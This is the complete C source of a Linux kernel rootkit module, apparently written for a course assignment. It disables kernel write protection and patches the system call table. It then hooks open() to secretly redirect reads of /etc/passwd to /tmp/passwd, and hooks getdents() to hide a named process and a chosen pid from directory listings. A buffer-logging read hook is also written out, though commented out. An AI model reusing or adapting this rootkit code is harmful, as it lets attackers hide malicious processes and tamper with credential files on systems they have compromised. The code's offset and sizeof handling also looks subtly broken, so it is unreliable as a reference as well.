#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/uaccess.h>
#include <asm/unistd.h> // for system call constants
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>
#include <linux/string.h>

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

// customized info
#define BUF_SIZE 512
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yuefan Yu");
static int pid = 0;
module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
char *processname = "sneaky_process";
char *filename = "/tmp/passwd";
char *modename = "sneaky_mod";
struct linux_dirent64 {
  u64 d_ino;               /* 64-bit inode number */
  s64 d_off;               /* 64-bit offset to next structure */
  unsigned short d_reclen; /* Size of this dirent */
  unsigned char d_type;    /* File type */
  char d_name[];           /* Filename (null-terminated) */
};

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect ti find its arguments on the stack (not in registers).
// This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage long (*orig_getdents)(unsigned int fd,
                                 struct linux_dirent64 __user *dirp,
                                 unsigned int count);
asmlinkage ssize_t (*orig_read)(int fd, char *buf, size_t count);
static int atoi(char *num) {
  int res = 0;
  while (*num != '\0') {
    if (*num < '0' || *num > '9')
      return -1;
    res = res * 10 + (*num - '0');
    num++;
  }
  return res;
}
asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
  printk(KERN_INFO "read:%s", buf);
  return orig_read(fd, buf, count);
}
asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                    struct linux_dirent64 __user *dirp,
                                    unsigned int count) {
  long total;
  long rest;
  int cur_pid;
  int len;
  total = (*orig_getdents)(fd, dirp, count);
  rest = total;

  while (rest > 0) {
    char *name;
    len = dirp->d_reclen;
    cur_pid = atoi(dirp->d_name - 1);
    name = dirp->d_name - 1;
    rest -= len;
    if (strcmp(name, processname) == 0) {
      memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
      total -= len;
    } else if (cur_pid == pid) {
      memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
      total -= len;
    }
    if (rest > 0)
      dirp = (struct linux_dirent64 *)((void *)dirp + dirp->d_reclen);
  }
  return total;
}
// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  if (strstr(pathname, "/etc/passwd") != NULL) {
    copy_to_user((void *)pathname, filename, sizeof(filename));
  }
  return original_call(pathname, flags);
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;
  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_call = (void *)*(sys_call_table + __NR_open);
  orig_getdents = (void *)*(sys_call_table + __NR_getdents);
  orig_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  //  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_read) = (unsigned long)orig_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)orig_getdents;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
